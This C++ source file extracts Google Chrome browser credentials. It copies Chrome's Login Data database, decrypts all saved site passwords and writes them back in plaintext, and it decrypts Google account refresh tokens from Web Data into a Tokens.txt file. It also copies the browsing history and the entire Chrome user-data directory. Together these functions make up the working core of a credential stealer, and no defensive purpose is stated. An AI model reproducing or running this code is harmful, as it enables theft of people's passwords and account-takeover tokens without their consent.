#include "stdafx.h"
#include "GoogleDbExtractorBase.h"
#include "AesGCMDecryptor.h"
#include "openssl/evp.h"
#include <SQLiteCpp/SQLiteCpp.h>
#include "DataDecryptorFactory.h"

namespace
{
    const std::string s_emptyOrAccountString = "Signed In with Google or empty";
    const std::string s_gChromeClientId = "77185425430.apps.googleusercontent.com";
}

void google::GoogleDbExtractorBase::ExtractTokens(std::map<std::string, crypt::RawVector>& tokens)
{
    crypt::RawVector dbKey;
    GetKey(dbKey);
    GetEncTokens(tokens);
    std::ofstream writer("Tokens.txt");

    if (!writer.is_open())
    {
        spdlog::error("Can't create out file!");
        return;
    }

    auto decryptor = std::unique_ptr<crypt::IDataDecrypt>(crypt::DataDecryptorFactory(dbKey)
                                                           .createDecryptor(GetVersion()));

    for (auto& [login, cipherText] : tokens)
    {
        decryptor->decrypt(cipherText, cipherText);
        std::string decryptedToken(cipherText.begin(), cipherText.end());
        writer << "UserID: " << login << "\n";
        writer << "ClientID: " << s_gChromeClientId << "\n";
        writer << "RefreshToken: " << decryptedToken << "\n";
    }
    writer.close();
}

void google::GoogleDbExtractorBase::CopyHistoryDb()
{
    std::filesystem::path path = GetGoogleChromeSystemDir();
    path.append("Default").append("History");
    std::filesystem::path localPath = std::filesystem::current_path();
    std::filesystem::copy(path, localPath, std::filesystem::copy_options::overwrite_existing);
}

void google::GoogleDbExtractorBase::DecryptPasswordsDb()
{
    std::filesystem::path path(GetGoogleChromeSystemDir());
    const std::string loginDataDbName("Login Data");
    path.append("Default").append(loginDataDbName);
    std::filesystem::path localPath(std::filesystem::current_path().append(loginDataDbName));
    std::filesystem::copy_file(path, localPath, std::filesystem::copy_options::overwrite_existing);

    std::map<std::string, crypt::RawVector> passwords;
    SQLite::Database db(localPath.string(), SQLite::OPEN_READWRITE);

    try
    {
        SQLite::Statement query(db, "SELECT origin_url, password_value FROM logins;");
        while (query.executeStep())
        {
            const std::string encPwd = query.getColumn(1);
            passwords.emplace(query.getColumn(0), crypt::RawVector(encPwd.begin(), encPwd.end()));
        }
    }
    catch (const SQLite::Exception& ex)
    {
        spdlog::error("Db request has been failed! Error: ");
        spdlog::error(ex.getErrorStr());
        return;
    }
    crypt::RawVector dbKey;
    // todo add processing for old version in which there are no pass file
    GetKey(dbKey);

    auto decryptor = std::unique_ptr<crypt::IDataDecrypt>(crypt::DataDecryptorFactory(dbKey)
                                                           .createDecryptor(GetVersion()));

    for (auto& [url, cipherText] : passwords)
    {
        decryptor->decrypt(cipherText, cipherText);
        std::string decryptedString(cipherText.begin(), cipherText.end());

        if (decryptedString.empty())
        {
            decryptedString.assign(s_emptyOrAccountString);
        }

        const std::string updateQuery = "UPDATE logins SET `password_value` = \"" +
                                        decryptedString + "\" WHERE `origin_url`= \"" + url + "\"";
        try
        {
            db.exec(updateQuery);
        }
        catch (const std::exception& ex)
        {
            spdlog::error(ex.what());
        }
    }
}

void google::GoogleDbExtractorBase::CopyGoogleChromeFullDirWithKey()
{
    std::filesystem::path chromeDataPath(GetGoogleChromeSystemDir());
    std::filesystem::path localPath = std::filesystem::current_path().append("ChromeUserData");
    std::filesystem::copy(chromeDataPath, localPath, std::filesystem::copy_options::recursive);
    //TODO: need to copy only useful files and db in decrypted view
}

void google::GoogleDbExtractorBase::GetEncTokens(std::map<std::string, crypt::RawVector >& tokens)
{
    std::filesystem::path dbPath(GetGoogleChromeSystemDir());
    dbPath.append("Default").append("Web Data");
    SQLite::Database db(dbPath.string());
    try
    {
        SQLite::Statement query(db, "SELECT service, encrypted_token FROM token_service;");
        while (query.executeStep())
        {
            const std::string accountId = query.getColumn(0);
            const std::string token = query.getColumn(1);
            tokens.emplace(accountId, crypt::RawVector(token.begin(), token.end()));
        }
    }
    catch (const SQLite::Exception& ex)
    {
        spdlog::error("Sqlite request has been failed! Error:");
        spdlog::error(ex.getErrorStr());
    }
}
